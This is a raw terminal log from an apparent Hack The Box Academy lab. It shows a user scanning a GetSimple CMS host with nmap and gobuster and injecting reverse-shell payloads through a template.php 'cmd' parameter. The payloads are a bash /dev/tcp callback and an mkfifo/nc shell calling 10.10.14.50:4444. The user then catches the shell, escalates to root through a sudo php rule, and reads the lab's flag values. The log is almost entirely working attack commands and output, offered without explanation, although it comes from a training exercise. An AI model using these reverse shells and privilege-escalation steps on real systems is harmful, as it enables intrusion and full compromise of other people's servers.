┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ ls
cacert.der  Documents  Music     Public     Videos
Desktop     Downloads  Pictures  Templates
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ 10.129.42.249
bash: 10.129.42.249: command not found
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ ping 10.129.42.249
PING 10.129.42.249 (10.129.42.249) 56(84) bytes of data.
64 bytes from 10.129.42.249: icmp_seq=1 ttl=63 time=247 ms
64 bytes from 10.129.42.249: icmp_seq=2 ttl=63 time=1.93 ms
^C
--- 10.129.42.249 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 1.933/124.401/246.870/122.468 ms
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ nmap -sV -sC 10.129.42.249
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-23 07:30 CDT
Nmap scan report for 10.129.42.249
Host is up (0.0028s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to GetSimple! - gettingstarted
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ gobuster dir -u http://10.129.42.249/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.42.249/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 5485]
/data                 (Status: 301) [Size: 313] [--> http://10.129.42.249/data/]
/admin                (Status: 301) [Size: 314] [--> http://10.129.42.249/admin/]
/plugins              (Status: 301) [Size: 316] [--> http://10.129.42.249/plugins/]
/theme                (Status: 301) [Size: 314] [--> http://10.129.42.249/theme/]
/readme.txt           (Status: 200) [Size: 1958]
/robots.txt           (Status: 200) [Size: 32]
/LICENSE.txt          (Status: 200) [Size: 35147]
/backups              (Status: 301) [Size: 316] [--> http://10.129.42.249/backups/]
/.php                 (Status: 403) [Size: 278]
Progress: 262992 / 262995 (100.00%)
===============================================================
Finished
===============================================================
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ curl -s "http://10.129.42.249/theme/Innovation/template.php?cmd=bash+-i+>%26+/dev/tcp/10.10.14.50/4444+0>%261"
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ ls
cacert.der  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ curl -s "http://10.129.42.249/theme/Innovation/template.php" --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ curl "http://10.129.42.249/theme/Innovation/template.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.50+4444+>/tmp/f"
^C
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ curl "http://10.129.42.249/theme/Innovation/template.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.50+4444+>/tmp/f"
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ ^C
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ curl -s "http://10.129.42.249/theme/Innovation/template.php" --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ curl "http://10.129.42.249/theme/Innovation/template.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.50+4444+>/tmp/f"
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ curl -s "http://10.129.42.249/theme/Innovation/template.php?cmd=bash+-i+>%26+/dev/tcp/10.10.14.50/4444+0>%261"
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ history
    1  ls
    2  10.129.42.249
    3  ping 10.129.42.249
    4  nmap -sV -sC 10.129.42.249
    5  gobuster dir -u http://10.129.42.249/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt
    6  curl -s "http://10.129.42.249/theme/Innovation/template.php?cmd=bash+-i+>%26+/dev/tcp/10.10.14.50/4444+0>%261"
    7  ls
    8  curl -s "http://10.129.42.249/theme/Innovation/template.php" --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"
    9  curl "http://10.129.42.249/theme/Innovation/template.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.50+4444+>/tmp/f"
   10  curl -s "http://10.129.42.249/theme/Innovation/template.php" --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.14.50/4444 0>&1"
   11  curl "http://10.129.42.249/theme/Innovation/template.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.50+4444+>/tmp/f"
   12  curl -s "http://10.129.42.249/theme/Innovation/template.php?cmd=bash+-i+>%26+/dev/tcp/10.10.14.50/4444+0>%261"
   13  history
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ 

--when i got the shell--

┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.50] from (UNKNOWN) [10.129.42.249] 51408
/bin/sh: 0: can't access tty; job control turned off
$ ls
a
assets
footer.inc.php
functions.php
header.inc.php
images
sidebar.inc.php
style.css
template.php
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@gettingstarted:/var/www/html/theme/Innovation$ ^Z
[1]+  Stopped                 nc -lvnp 4444
┌─[eu-academy-4]─[10.10.14.50]─[htb-ac-793988@htb-rvvkbkebsb]─[~]
└──╼ [★]$ stty raw -echo; fg
export TERM=xterm
nc -lvnp 4444
             ^C
www-data@gettingstarted:/var/www/html/theme/Innovation$ ls
a	footer.inc.php	header.inc.php	sidebar.inc.php  template.php
assets	functions.php	images		style.css
www-data@gettingstarted:/var/www/html/theme/Innovation$ tree

Command 'tree' not found, but can be installed with:

snap install tree  # version 1.8.0+pkg-3fd6, or
apt  install tree  # version 1.8.0-1

See 'snap info tree' for additional versions.

www-data@gettingstarted:/var/www/html/theme/Innovation$ ls
a	footer.inc.php	header.inc.php	sidebar.inc.php  template.php
assets	functions.php	images		style.css
www-data@gettingstarted:/var/www/html/theme/Innovation$ cd ..
www-data@gettingstarted:/var/www/html/theme$ cd ..
www-data@gettingstarted:/var/www/html$ cd ..
www-data@gettingstarted:/var/www$ cd ..
www-data@gettingstarted:/var$ cd ..
www-data@gettingstarted:/$ ls
bin   cdrom  etc   lib	  lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
www-data@gettingstarted:/$ cd usr/
www-data@gettingstarted:/usr$ ls
bin    include	lib32  libexec	local  share
games  lib	lib64  libx32	sbin   src
www-data@gettingstarted:/usr$ cd ..
www-data@gettingstarted:/$ cd root/
bash: cd: root/: Permission denied
www-data@gettingstarted:/$ sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
www-data@gettingstarted:/$ ^C
www-data@gettingstarted:/$ sudo php -r "system('/bin/bash');"
root@gettingstarted:/# find / -name "root.txt" 2>/dev/null

^C
root@gettingstarted:/# 
root@gettingstarted:/# find / -name "user.txt" 2>/dev/null
/home/mrb3n/user.txt
root@gettingstarted:/# 11  find / -name "user.txt" 2>/dev/nullroot.txt" 2>/dev/nullroot@gettingstarted:/# find / -name "root.txt" 2>/dev/nuroot@gettingstarted:/# find / -name "root.txt" 2>/dev/nulroot@gettingstarted:/# find / -name "root.txt" 2>/dev/null^C
root@gettingstarted:/# find / -name "root.txt" 2>/dev/null
/root/root.txt
root@gettingstarted:/# v ca  
root@gettingstarted:/# cat /home/mrb3n/user.txt
7002d65b149b0a4d19132a66feed21d8
root@gettingstarted:/# 
root@gettingstarted:/# cat /home/root.txt
cat: /home/root.txt: No such file or directory
root@gettingstarted:/# cat ~/root.txt
f1fba6e9f71efb2630e6e34da6387842
root@gettingstarted:/# ^C
root@gettingstarted:/# 

